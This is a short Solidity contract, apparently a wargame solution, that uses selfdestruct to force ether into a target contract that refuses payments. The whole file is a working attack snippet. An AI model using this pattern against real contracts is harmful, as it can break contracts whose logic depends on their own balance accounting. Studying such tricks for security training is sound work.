// SPDX-License-Identifier: NOLICENCE
pragma solidity ^0.8.0;

contract ForceAttacker {
    receive() external payable {}

    function attack(address payable _target) public {
        selfdestruct(_target);
    }
}
